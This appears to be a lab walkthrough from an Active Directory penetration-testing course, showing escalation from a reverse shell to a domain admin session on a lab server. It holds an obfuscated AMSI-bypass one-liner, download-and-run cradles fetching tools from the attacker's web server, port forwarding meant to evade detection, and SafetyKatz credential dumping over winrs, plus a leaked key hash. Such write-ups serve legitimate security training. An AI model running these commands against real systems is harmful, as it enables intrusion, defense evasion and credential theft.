# 🪜 Domain admin session in target domain -> escalate privileges

We are going to start by using **Find-DomainUserLocation** on the reverse shell we got earlier as ciadmin to looks for machines where a domain admin is logged in.

{% embed url="https://powersploit.readthedocs.io/en/latest/Recon/Find-DomainUserLocation/" %}

So we start by hosting our web server using wsl to bypass Enhanced Script Block Logging. Unfortunately, we have no in-memory bypass for PowerShell transcripts. Note that we could also paste the contents of sbloggingbypass.txt in place of the download-exec cradle.

```
iex (iwr http://172.16.100.13/sbloggingbypass.txt -UseBasicParsing)
```

Then we use the below command to bypass AMSI:

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Then we had a tip from a guy on discord to host a web server using WSL rather than hfs.exe ->

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

We then download power View on the target machine and launch the following command: Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in.&#x20;

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.13:6565/PowerView.ps1'))
```

```
Find-DomainUserLocation
```

We can see that there is a domain admin session on dcorp-mgmt server!

Now, we have to check if we can execute commands on dcorp-mgmt server and if the winrm port is open:

`winrs` (Windows Remote Shell) is a command-line tool that allows you to execute commands on remote Windows machines. It is similar to SSH for Windows systems.

```
winrs -r:dcorp-mgmt set computername;set username
```

Now we need to copy the Loader.exe to dcorp-mgmt:

First we copy it to our reverse shell then we load it on the target machine ->

```
iwr http://172.16.100.13:6565/Loader.exe -OutFile C:\Users\Public\Loader.exe
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

We need to avoid detection on  `dcorp-mgmt` by setting up port forwarding. This will allow traffic to be redirected from one port to another, effectively masking the original connection.

```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.13"
```

Then i wanted to run SafetyKatz

```
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.13:6565/SafetyKatz.exe sekurlsa::ekeys exit
```

And unexpectedly it worked without any problems ->

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption><p>*ThisisBlasphemyThisisMadness!! // 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011</p></figcaption></figure>

Now with these credentials, we are going to go and perform Over pass the hash and use svcadmin's creds. On the student VM we're going to run an elevated shell and try to bypass potential detection:

<figure><img src="../../.gitbook/assets/image (1080).png" alt=""><figcaption></figcaption></figure>
